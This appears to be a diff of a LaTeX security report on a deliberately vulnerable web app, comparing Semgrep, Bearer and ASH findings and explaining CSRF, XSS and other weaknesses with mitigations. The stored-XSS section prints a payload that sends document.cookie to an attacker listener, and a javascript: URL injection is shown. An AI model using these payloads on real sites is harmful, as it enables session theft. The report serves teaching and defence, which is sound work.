@@ -169,7 +169,29 @@ The other vulnerabilities have been explained later in this paper.
 Semgrep is an open-source static analysis engine for finding bugs, detecting vulnerabilities in third-party dependencies, 
 and enforcing code standards. It also allows to define custom rules to analyse the code. 
 
-\subsubsection{React insecure request}
+\subsubsection{How to configure}
+ 
+\begin{enumerate}
+\item Install Semgrep CLI
+\begin{lstlisting}[numbers=none]
+For macOS
+$ brew install semgrep
+
+For Ubuntu/WSL/Linux/macOS
+$ python3 -m pip install semgrep
+
+To try Semgrep without installation run via Docker
+$ docker run -it -v "${PWD}:/src" semgrep/semgrep semgrep login
+$ docker run -e SEMGREP_APP_TOKEN=<TOKEN> --rm -v "${PWD}:/src" semgrep/semgrep semgrep ci
+\end{lstlisting}
+\item Run \texttt{semgrep login} to create your account and login to Semgrep. 
+\item Run \texttt{export SEMGREP\_REPO\_URL=REPO\_URL}
+\item Go to your app's root directory and run \texttt{semgrep ci --code}. This will scan your project to check for vulnerabilities in your source code.
+\end{enumerate}
+
+\subsubsection{Vulnerable web-app analysis}
+
+\paragraph{React insecure request} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:cleartext_transmission_of_sensitive_information]{True positive.} \\ 
 \textbf{Description:} Unencrypted request over HTTP detected. \\ 
 \textbf{Severity:} High. \\ 
@@ -180,7 +202,7 @@ and enforcing code standards. It also allows to define custom rules to analyse t
     \item \texttt{client/src/api/users.js:3-23-45-67}
 \end{itemize}
 
-\subsubsection{Code string concat}
+\paragraph{Code string concat} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:improper_neutralization_of_directives_in_dynamically_evaluated_code]{True positive.} \\ 
 \textbf{Description:} Found data from an Express or Next web request flowing to eval. If this data is user-controllable this can 
 lead to execution of arbitrary system commands in the context of your application process. Avoid eval whenever possible. \\ 
@@ -190,7 +212,7 @@ lead to execution of arbitrary system commands in the context of your applicatio
     \item server/src/routes/authentication.js:69
 \end{itemize}
 
-\subsubsection{Weak symmetric mode}
+\paragraph{Weak symmetric mode} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:use_of_a_broken_or_risky_cryptographic_algorithm]{True positive.} \\ 
 \textbf{Description:} Detected the use of createCipheriv("aes-128-ecb") which is considered a weak cryptographic mode. Where possible, 
 leverage the industry standard recommendation which is to use a block cipher such as AES with at least 128-bit strength, an example 
@@ -202,7 +224,7 @@ of a secure algorithm is AES-256-GCM. If your company has its own guidelines, yo
     \item server/src/crypto.js:28
 \end{itemize}
 
-\subsubsection{Incomplete sanitization}
+\paragraph{Incomplete sanitization} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:improper_limitation_of_a_pathname_to_a_restricted_directory]{True positive.} \\ 
 \textbf{Description:} username.replace method will only replace the first occurrence when used with a string argument ("). 
 If this method is used for escaping of dangerous data then there is a possibility for a bypass. Try to use sanitization 
@@ -213,7 +235,7 @@ library instead or use a Regex with a global flag. \\
     \item server/src/routes/transactions.js:234-258
 \end{itemize}
 
-\subsubsection{Eval detected}
+\paragraph{Eval detected} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:improper_neutralization_of_directives_in_dynamically_evaluated_code]{True positive.} \\ 
 \textbf{Description:} Detected the use of eval(). eval() can be dangerous if used to evaluate dynamic content. If this 
 content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is 
@@ -224,7 +246,7 @@ not definable by external sources. \\
     \item server/src/routes/authentication.js:69
 \end{itemize}
 
-\subsubsection{Express cookie session default name}
+\paragraph{Express cookie session default name} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\ 
 \textbf{Description:} Don't use the default session cookie name Using the default session cookie name can open your 
 app to attacks. The security issue posed is similar to X-Powered-By: a potential attacker can use it to fingerprint 
@@ -235,7 +257,7 @@ the server and target attacks accordingly. \\
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{Express cookie session no secure}
+\paragraph{Express cookie session no secure} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:sensitive_cookie_without_secure_and_httponly_attributes]{True positive.} \\ 
 \textbf{Description:} Default session middleware settings: secure not set. It ensures the browser only
  sends the cookie over HTTPS. \\ 
@@ -245,7 +267,7 @@ the server and target attacks accordingly. \\
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{Express cookie session no httponly}
+\paragraph{Express cookie session no httponly} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:cross_site_scripting]{True positive.} \\ 
 \textbf{Description:} Default session middleware settings: httpOnly not set. It ensures the cookie is sent 
 only over HTTP(S), not client JavaScript, helping to protect against cross-site scripting attacks. \\ 
@@ -255,7 +277,7 @@ only over HTTP(S), not client JavaScript, helping to protect against cross-site 
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{Express cookie session no domain}
+\paragraph{Express cookie session no domain} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\ 
 \textbf{Description:} Default session middleware settings: domain not set. It indicates the domain of 
 the cookie; use it to compare against the domain of the server in which the URL is being requested. 
@@ -266,7 +288,7 @@ If they match, then check the path attribute next. \\
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{Express cookie session no path}
+\paragraph{Express cookie session no path} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\ 
 \textbf{Description:} Default session middleware settings: path not set. It indicates the path of the cookie; use it to compare against the request path. If this and domain match, then send the cookie in the request. 
 Note: Without a specific path, the cookie is sent for all paths on the domain.
@@ -276,7 +298,7 @@ Note: Without a specific path, the cookie is sent for all paths on the domain.
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{Express cookie session no expires}
+\paragraph{Express cookie session no expires} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\ 
 \textbf{Description:}  Default session middleware settings: expires not set. Use it to set expiration date for persistent cookies. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -285,7 +307,7 @@ Note: Without a specific path, the cookie is sent for all paths on the domain.
     \item server/src/index.js:30
 \end{itemize}
 
-\subsubsection{React dangerouslysetinnerhtml}
+\paragraph{React dangerouslysetinnerhtml} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[par:stored_xss]{True positive.} \\ 
 \textbf{Description:} Detection of dangerouslySetInnerHTML from non-constant definition. This can 
 inadvertently expose users to cross-site scripting (XSS) attacks if this comes from user-provided
@@ -297,7 +319,7 @@ DOMPurify to sanitize your HTML. \\
     \item client/src/routes/sellerRegistration.js:120
 \end{itemize}
 
-\subsubsection{Express third party object deserialization}
+\paragraph{Express third party object deserialization} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:deserialization_of_untrusted_data]{True positive.} \\ 
 \textbf{Description:} The following function call $SER.$FUNC accepts user controlled data which 
 can result in Remote Code Execution (RCE) through Object Deserialization. It is recommended to 
@@ -308,7 +330,7 @@ use secure data processing alternatives such as JSON.parse() and Buffer.from(). 
     \item server/src/routes/transactions.js:67
 \end{itemize}
 
-\subsubsection{Express check directory listing}
+\paragraph{Express check directory listing} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:exposure_of_information_through_directory_listing]{True positive.} \\ 
 \textbf{Description:} Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories 
 and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, 
@@ -319,7 +341,7 @@ ensure that sensitive files are inaccessible when querying the resource. \\
     \item server/src/index.js:53
 \end{itemize}
 
-\subsubsection{Express check csurf middleware usage}
+\paragraph{Express check csurf middleware usage} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:csrf_with_samesite_none_misconfiguration]{True positive.} \\ 
 \textbf{Description:} A CSRF middleware was not detected in your express application. Ensure you are either using 
 one such as csurf or csrf (see rule references) and/or you are properly doing CSRF validation in your routes with 
@@ -330,10 +352,30 @@ a token or cookies.\\
     \item server/src/index.js:16
 \end{itemize}
 
+\subsubsection{Secure Web-app Analysis}
+
+\paragraph{Express Check Csurf Middleware Usage} \mbox{} \\ \\
+\textbf{Classification:} False positive. Same site policy is set to "strict" to avoid sending cookies in cross site requests but it is needed to pay attention to malicious subdomains.\\
+\textbf{Description:} A CSRF middleware was not detected in your express application. Ensure you are either using one such as csurf or csrf (see rule references) and/or you are properly doing CSRF validation in your routes with a token or cookies. \\ 
+\textbf{Severity:} Low. \\ 
+\textbf{Vulnerable code:}
+\begin{itemize}
+    \item \texttt{server/src/index.js:17}
+\end{itemize}
+
+\paragraph{Path Join Resolve Traversal} \mbox{} \\ \\
+\textbf{Classification:} False positive. \texttt{path.join} does not receive a user input. \\
+\textbf{Description:} Detected possible user input going into a path.join or path.resolve function. This could possibly lead to a path traversal vulnerability, where the attacker can access arbitrary files stored in the file system. Instead, be sure to sanitize or validate user input first. \\ 
+\textbf{Severity:} Medium. private file\\ 
+\textbf{Vulnerable code:}
+\begin{itemize}
+    \item \texttt{server/src/index.js:234-257}
+\end{itemize}
+
 \subsection{Bearer CLI}
 Bearer CLI is a free, open-source command-line tool that scans source code for security vulnerabilities and privacy risks. Supporting languages like JavaScript, Ruby, and Python, it uses static analysis to detect issues from the OWASP Top 10 and CWE Top 25, prioritizing based on the impact on sensitive data. It provides detailed security and privacy reports to help developers quickly address critical issues.
 
-\subsubsection{Unsanitized input in NoSQL query}
+\paragraph{Unsanitized input in NoSQL query} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Using unsanitized data in NoSQL queries exposes your application to NoSQL injection attacks. This vulnerability arises when user input, request data, or any externally influenced data is directly passed into a NoSQL query function without proper sanitization. \\
 \textbf{Severity:} Critical. \\ 
@@ -346,7 +388,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
 \end{itemize}
 \textbf{Note:} Bearer CLI for some reason sees sqlite queries as nosql, but the weakness is correct.
 
-\subsubsection{Unsanitized user input in deserialization method}
+\paragraph{Unsanitized user input in deserialization method} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:deserialization_of_untrusted_data]{True positive.} \\
 \textbf{Description:} Deserializing untrusted data exposes your application to security risks. This vulnerability occurs when data, especially from external sources like request objects, is deserialized without proper sanitization. Attackers can embed malicious code or payloads in serialized data, compromising your application's security upon deserialization. \\ 
 \textbf{Severity:} Critical. \\ 
@@ -355,7 +397,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/routes/transactions.js:67}
 \end{itemize}
 
-\subsubsection{Unsanitized dynamic input in file path}
+\paragraph{Unsanitized dynamic input in file path} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:improper_limitation_of_a_pathname_to_a_restricted_directory]{True positive.} \\
 \textbf{Description:} Using unsanitized dynamic input to determine file paths can allow attackers to gain access to files and folders outside of the intended scope. This vulnerability occurs when input provided by users is directly used to access the filesystem without proper validation or sanitization. \\ 
 \textbf{Severity:} High. \\ 
@@ -365,7 +407,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/routes/transactions.js:258}
 \end{itemize}
 
-\subsubsection{Unsanitized user input in React inner HTML method (XSS)}
+\paragraph{Unsanitized user input in React inner HTML method (XSS)} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:cross_site_scripting]{True positive.} \\
 \textbf{Description:} Using React's dangerouslySetInnerHTML with unsanitized data can introduce Cross-Site Scripting (XSS) vulnerabilities. This occurs when external input is embedded directly into the HTML without proper sanitization, allowing attackers to inject malicious scripts. \\ 
 \textbf{Severity:} High. \\ 
@@ -376,7 +418,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
 \end{itemize}
 \textbf{Note:} The tool is not able to detect the DOM XSS vulnerable code in 'client/src/routes/changeTheme.js:48'. \\
 
-\subsubsection{Missing HTTP Only option in cookie configuration}
+\paragraph{Missing HTTP Only option in cookie configuration} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:sensitive_cookie_without_secure_and_httponly_attributes]{True positive.} \\
 \textbf{Description:} Your cookies are at risk if the HTTP Only option is not configured. This setting prevents client-side JavaScript, such as the code that reads ``document.cookie'' values, from accessing the cookie's value. Enabling this option is crucial for websites prone to Cross-Site Scripting (XSS) attacks, because it prevents malicious scripts from obtaining the cookie's data. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -385,7 +427,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:30}
 \end{itemize}
 
-\subsubsection{Usage of default cookie configuration}
+\paragraph{Usage of default cookie configuration} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Using default cookie configurations can expose your application to security risks. This vulnerability arises when cookies are set with their default values, making them predictable and easier to exploit. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -394,7 +436,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:39}
 \end{itemize}
 
-\subsubsection{Usage of default session cookie configuration}
+\paragraph{Usage of default session cookie configuration} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Using default session cookie configurations can expose your application to security vulnerabilities. This vulnerability arises when session cookies are set with their default values, making them predictable and easier to exploit. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -403,7 +445,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:30}
 \end{itemize}
 
-\subsubsection{Missing Helmet configuration on HTTP headers}
+\paragraph{Missing Helmet configuration on HTTP headers} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Helmet can help protect your app from some well-known web vulnerabilities by setting HTTP headers appropriately. Failing to configure Helmet for HTTP headers leaves your application vulnerable to several web attacks. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -412,7 +454,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:16}
 \end{itemize}
 
-\subsubsection{Missing Secure option in cookie configuration}
+\paragraph{Missing Secure option in cookie configuration} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:sensitive_cookie_without_secure_and_httponly_attributes]{True positive.} \\
 \textbf{Description:} When a cookie lacks the Secure attribute, it can be transmitted over an unencrypted connection, making it vulnerable to interception by unauthorized parties. Enabling the Secure option ensures that cookies are only sent over HTTPS, enhancing the security of data in transit. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -421,7 +463,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:30}
 \end{itemize}
 
-\subsubsection{Missing server configuration to reduce server fingerprinting}
+\paragraph{Missing server configuration to reduce server fingerprinting} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Reducing server fingerprinting enhances security by making it harder for attackers to identify the software your server is running. Server fingerprinting involves analyzing the unique responses of server software to specific requests, which can reveal information about the server's software and version. While not a direct security vulnerability, minimizing this information leakage is a proactive step to obscure details that could be used in targeted attacks. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -430,7 +472,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:16}
 \end{itemize}
 
-\subsubsection{Observable Timing Discrepancy}
+\paragraph{Observable Timing Discrepancy} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Observable Timing Discrepancy occurs when the time it takes for certain operations to complete can be measured and observed by attackers. This vulnerability is particularly concerning when operations involve sensitive information, such as password checks or secret comparisons. If attackers can analyze how long these operations take, they might be able to deduce confidential details, putting your data at risk. \\ 
 \textbf{Severity:} Medium. \\ 
@@ -439,7 +481,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{client/src/routes/editUserProfile.js:60}
 \end{itemize}
 
-\subsubsection{Missing access restriction on directory listing}
+\paragraph{Missing access restriction on directory listing} \mbox{} \\ \\
 \textbf{Classification:} \hyperref[subsubsec:exposure_of_information_through_directory_listing]{True positive.} \\
 \textbf{Description:} Exposing a directory listing without restrictions can lead to unauthorized access to sensitive data or source code. This vulnerability occurs when the file structure of a server or application is made visible to users without proper access control, potentially allowing attackers to exploit the exposed file structure. \\ 
 \textbf{Severity:} Low. \\ 
@@ -448,7 +490,7 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
     \item \texttt{server/src/index.js:53}
 \end{itemize}
 
-\subsubsection{Leakage of information in logger message}
+\paragraph{Leakage of information in logger message} \mbox{} \\ \\
 \textbf{Classification:} True positive. \\
 \textbf{Description:} Information leakage through logger messages can compromise sensitive data. This vulnerability arises when dynamic data or variables, which may contain sensitive information, are included in log messages. \\ 
 \textbf{Severity:} Low. \\ 
@@ -463,17 +505,17 @@ Bearer CLI is a free, open-source command-line tool that scans source code for s
 The security helper tool was created to help you reduce the probability of a security violation in a new code, infrastructure or IAM configuration by providing a fast and easy tool to conduct preliminary security check as early as possible within your development process.
 
 \subsubsection{How to configure}
-\paragraph{Prerequisites} 
+\paragraph{Prerequisites} \mbox{} \\ \\
 To start using ash you have to install and configure the following:
 \begin{itemize}
 \item Windows Subsystem for Linux (WSL) on Windows 
 \item Tools installed to run Linux containers, such as Finch, Rancher Desktop, Podman Desktop, or Docker Desktop.
 \end{itemize}
 
-\paragraph{Getting Started - Linux or MacOS} 
+\paragraph{Getting Started - Linux or MacOS} \mbox{} \\ \\
 Clone the git repository into a folder. For example:
 
-\begin{lstlisting}
+\begin{lstlisting}[numbers=none]
 Set up some variables
 REPO_DIR="${HOME}"/Documents/repos/reference
 REPO_NAME=automated-security-helper
@@ -497,9 +539,9 @@ Execute the ash tool
 ash --version
 \end{lstlisting}
 
-\paragraph{Examples}
+\paragraph{Examples} \mbox{} \\ \\
 Here's some examples:
-\begin{lstlisting}
+\begin{lstlisting}[numbers=none]
 Getting help
 ash -h
 
@@ -517,7 +559,7 @@ ash --source-dir . --ext py
 \end{lstlisting}
 
 \subsubsection{Unencrypted request over HTTP detected}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:cleartext_transmission_of_sensitive_information]{True positive.} \\
 \textbf{Description:}  The application allows users to connect to it over unencrypted connections. An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies. \\ 
 \textbf{Severity:}  High \\ 
 \textbf{Vulnerable code:}
@@ -528,7 +570,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{Detection of dangerouslySetInnerHTML from non-constant definition}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[par:stored_xss]{True positive.} \\ 
 \textbf{Description:} This can inadvertently expose users to cross-site scripting (XSS) attacks if this comes from user-provided input. If dangerouslySetInnerHTML is needed, a sanitization library such as DOMPurify to sanitize the HTML is suggested. \\ 
 \textbf{Severity:}  Medium \\ 
 \textbf{Vulnerable code:}
@@ -537,7 +579,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{CSRF middleware not detected in express application}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:csrf_with_samesite_none_misconfiguration]{True positive.} \\ 
 \textbf{Description:}  Ensure you are either using one such
           as `csurf` or `csrf` (see rule references) and/or you are properly doing CSRF validation in your    
           routes with a token or cookies.\\ 
@@ -582,7 +624,7 @@ ash --source-dir . --ext py
 
 
 \subsubsection{Default session settings: no-httponly}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:cross_site_scripting]{True positive.} \\ 
 \textbf{Description:} httpOnly not set. It ensures the cookie is sent only over
           HTTP(S), not client JavaScript, helping to protect against cross-site scripting attacks. \\
 \textbf{Severity:}  Medium\\ 
@@ -602,7 +644,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{Default session settings: secure not set}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:sensitive_cookie_without_secure_and_httponly_attributes]{True positive.} \\ 
 \textbf{Description:} It ensures the browser only sends the cookie over HTTPS. \\
 \textbf{Severity:}  Medium\\ 
 \textbf{Vulnerable code:}
@@ -611,7 +653,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{Directory listing/indexing enabled}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:exposure_of_information_through_directory_listing]{True positive.} \\
 \textbf{Description:} Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and 
           files. It is recommended to disable directory listing unless it is a public resource. If you need
           directory listing, ensure that sensitive files are inaccessible when querying the resource. \\
@@ -622,7 +664,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{eval() function detected}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:improper_neutralization_of_directives_in_dynamically_evaluated_code]{True positive.} \\ 
 \textbf{Description:} eval() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources. \\ 
 \textbf{Severity:} Medium \\ 
 \textbf{Vulnerable code:}
@@ -631,7 +673,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{Third party object deserialization}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:deserialization_of_untrusted_data]{True positive.} \\
 \textbf{Description:} The following function call \texttt{node\_serialize.unserialize} accepts user controlled data which can result in Remote Code Execution (RCE) through Object Deserialization. It is recommended to use secure data processing alternatives such as JSON.parse() and Buffer.from() \\ 
 \textbf{Severity:} Medium \\ 
 \textbf{Vulnerable code:}
@@ -640,7 +682,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsubsection{Incomplete sanitization}
-\textbf{Classification:} {True positive.} \\
+\textbf{Classification:} \hyperref[subsubsec:improper_limitation_of_a_pathname_to_a_restricted_directory]{True positive.} \\ 
 \textbf{Description:} \texttt{req.session.user.username.replace} method will only replace the first occurrence when used with a  
           string argument ("\textbackslash n"). If this method is used for escaping of dangerous data then there is a       
           possibility for a bypass. Try to use sanitization library instead or use a Regex with a global flag. \\ 
@@ -651,6 +693,7 @@ ash --source-dir . --ext py
 \end{itemize}
 
 \subsection{Weakness scan result table}
+\begin{center}
 \begin{tabular}{| m{10cm} | c | c | c |}
 \hline
 \textbf{Weakness} & \textbf{Semgrep} & \textbf{Bearer} & \textbf{ASH} \\ 
@@ -702,7 +745,7 @@ Usage of default cookie configuration & & \cmark & \\
 Usage of default session cookie configuration & & \cmark & \\ 
 \hline
 \end{tabular}
-
+\end{center}
 
 \newpage
 
@@ -715,10 +758,8 @@ Access Control is considered broken when it is improperly configured or bypassed
 \subsubsection{CSRF (Cross-Site Request Forgery)}
 \label{subsubsec:csrf_with_samesite_none_misconfiguration}
 \textbf{Description:}  
-\texttt{CSRF} (Cross-Site Request Forgery) is a vulnerability categorized under \textit{broken access control}, and the same for \texttt{Sensitive Cookie with Improper SameSite Attribute}. This attack occurs when a malicious website tricks an authenticated user into making unintended requests to a vulnerable web application. As a result, attackers can perform unauthorized actions on behalf of the user without their knowledge. A common cause of this vulnerability is the misconfiguration of the `SameSite` attribute in cookies.
-
-The \texttt{SameSite} attribute has three possible values: `Strict`, `Lax` and `None`. When set to `None`, cookies can be sent with cross-site requests, which increases the risk of CSRF attacks. Note: setting to 'Lax' is dangerous too.
-
+\texttt{CSRF} (Cross-Site Request Forgery) is a vulnerability categorized under \textit{broken access control}, and the same for \texttt{Sensitive Cookie with Improper SameSite Attribute}. This attack occurs when a malicious website tricks an authenticated user into making unintended requests to a vulnerable web application. As a result, attackers can perform unauthorized actions on behalf of the user without their knowledge. A common cause of this vulnerability is the misconfiguration of the `SameSite` attribute in cookies. \\ 
+The \texttt{SameSite} attribute has three possible values: `Strict`, `Lax` and `None`. When set to `None`, cookies can be sent with cross-site requests, which increases the risk of CSRF attacks. Note: setting to 'Lax' is dangerous too. 
 \textbf{Vulnerable Code:}
 CSRF vulnerability arises from the misconfiguration of the SameSite attribute. Below is shown such misconfiguration in the Express backend's cookie settings:
 
@@ -730,12 +771,9 @@ cookie: {
     maxAge: 3600000000
 }
 \end{lstlisting}
-
-In this case, the `sameSite: "None"` configuration allows cookies to be sent in cross-origin requests, which can be exploited by attackers to perform malicious actions. The CORS configuration, often assumed to protect against CSRF, does not prevent such attacks. Even if CORS is configured securely (e.g., `origin: "http://frontend.example.com"`), CSRF can still occur through requests classified as "simple" by browsers, such as those originating from HTML forms.
-
+In this case, the `sameSite: "None"` configuration allows cookies to be sent in cross-origin requests, which can be exploited by attackers to perform malicious actions. The CORS configuration, often assumed to protect against CSRF, does not prevent such attacks. Even if CORS is configured securely (e.g., `origin: "http://frontend.example.com"`), CSRF can still occur through requests classified as "simple" by browsers, such as those originating from HTML forms. \\ 
 \textbf{Exploitation:}
-A malicious website hosted on a domain such as \texttt{malware.example2.com} can automatically (without using intervention) submit authenticated requests (so requests having session cookie) to the vulnerable backend. The attack does not perform preflight requests, bypassing CORS entirely, and browser automatically attaches the cookies due to the `SameSite=None` misconfiguration.
-
+A malicious website hosted on a domain such as \texttt{malware.example2.com} can automatically (without using intervention) submit authenticated requests (so requests having session cookie) to the vulnerable backend. The attack does not perform preflight requests, bypassing CORS entirely, and browser automatically attaches the cookies due to the `SameSite=None` misconfiguration. \\ 
 Here is an example of a malicious HTML form that exploits the vulnerability:
 
 \begin{lstlisting}
@@ -763,9 +801,7 @@ return(
 
 // ... other code
 \end{lstlisting}
-
-In this case, as soon as the user visits the malicious website, the form is submitted, and cookies (including session cookies) are automatically sent to \texttt{backend.example.com}, exploiting the authenticated session of the user.
-
+In this case, as soon as the user visits the malicious website, the form is submitted, and cookies (including session cookies) are automatically sent to \texttt{backend.example.com}, exploiting the authenticated session of the user. \\ 
 \textbf{Mitigation:}  
 To prevent CSRF attacks resulting from `SameSite=None` misconfigurations, there are some guidelines and suggestions:
 
@@ -789,7 +825,6 @@ To prevent CSRF attacks resulting from `SameSite=None` misconfigurations, there 
     \end{lstlisting}
     Additionally, ensure that you block requests with content types such as \texttt{application/x-www-form-urlencoded}, \texttt{multipart/form-data}, or \texttt{text/plain}, which are classified as "simple" requests by browsers and do not trigger CORS preflight checks.
 \end{enumerate}
-
 \textbf{Testing Environment:}
    To correctly test this vulnerability, you cannot use 'localhost' because the websites would seem all in the same domain. For a more realistic test, we used 'nginx' and '/etc/hosts' file to simulate cross-origin requests and test CSRF defenses. For instance, redirect \texttt{frontend.example.com} to \texttt{localhost:3000} React frontend, \texttt{backend.example.com} to \texttt{localhost:3001} Express backend, and \texttt{malware.example2.com} to \texttt{localhost:3002} for testing. We added these files into the \texttt{Exploit} git repo.
 
@@ -908,7 +943,6 @@ router.post("/registration", function (req, res) {
 
 \subsubsection{URL Parameter Tampering}
 \textbf{Description:} The  URL Parameter Tampering is a type of Web Parameter Tampering attacks. It is based on the manipulation of query string parameters that are part of the URL.\\ 
-
 \textbf{Vulnerable code:}
 In \texttt{editUserProfile.js} there is no check that ensures that the userid specified in the url matches the userid of the currently logged in user.
 In \texttt{authentication.js} the \texttt{/user/:id} endpoint allows to retrieve confidential user data without verifying the identity of the requester:
@@ -1125,33 +1159,28 @@ Cross-Site Scripting (XSS) involves injecting malicious HTML with embedded scrip
 
 \paragraph{Stored Cross-Site Scripting}
 \label{par:stored_xss}
-Stored XSS is particularly dangerous because the malicious script is stored on the server and affects all users who visit the compromised page without any need for the user to click on a malicious link.
-
+Stored XSS is particularly dangerous because the malicious script is stored on the server and affects all users who visit the compromised page without any need for the user to click on a malicious link. \\
 \textbf{Vulnerable code:}
 Consider the situation where sellers can register and provide their street address. In the frontend React application, the street address is displayed using the \texttt{dangerouslySetInnerHTML} property, which can render HTML content provided by the user. The vulnerable code in \texttt{routes/sellerRegistration.js} is as follows:
 
 \begin{lstlisting}
 <td><div dangerouslySetInnerHTML={{ __html: props.seller.address }}/></td> 
-\end{lstlisting}
-
+\end{lstlisting} 
 \textbf{Exploitation:}
 If an attacker registers a seller account with the following street address:
 
 \begin{lstlisting}
 <audio src="" onerror="fetch('http://localhost:1337', {method:'POST', body:document.cookie})">
 \end{lstlisting}
-
 The React component will render this HTML, and the malicious script will execute whenever an admin views the seller confirmation page. This script sends the admin's cookies to the attacker's server running on \texttt{localhost:1337}. If the attacker has a netcat listener on port \texttt{1337}, they can capture the cookies:
-
 \begin{figure}[h]
 \includegraphics[width=8cm]{images/stored_xss.eps}
 \centering
-\end{figure}
-
+\end{figure} \\ 
 \textbf{Mitigation:}
 To prevent Stored XSS vulnerabilities, it is essential to set cookies with the \texttt{HttpOnly: true} flag to prevent access to \texttt{document.cookie}, sanitize user input, and avoid using \texttt{dangerouslySetInnerHTML} or any other methods that directly inject user-supplied HTML into the DOM.
 
-\subparagraph{Reflected DOM Injection \\}
+\subparagraph{Reflected DOM Injection} \mbox{} \\ 
 \textbf{Description:} Reflected DOM Injection (RDI) is a form of Stored Cross-Site Scripting. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.
 \\ \textbf{Exploitation:} An attacker, by registering as a Seller, has the ability to insert a URL that redirects to the seller's website. Instead of inserting a link, since there is no control, he can directly insert javascript code (\texttt{javascript:<code>}) that is executed when a user tries to visit the seller's website. The example we have inserted is: \\ 
 \texttt{javascript:window.opener.alert('Malicious code is now running :)');window.close()} \\
@@ -1165,25 +1194,20 @@ The most effective way to avoid DOM-based JavaScript injection vulnerabilities i
 
 \paragraph{Reflected Cross-Site Scripting}
 
-Reflected Cross-Site Scripting (XSS) occurs when user input is reflected in the server's response without proper validation. For example, an attacker might craft a malicious search URL containing a script. The server processes the request without sanitizing the input, and the frontend displays a message like "You are searching for XYZ," where "XYZ" is the malicious script. The browser then executes the script, potentially exposing sensitive data. Reflected XSS, also known as Non-Persistent XSS, happens in a single request-response cycle.
-
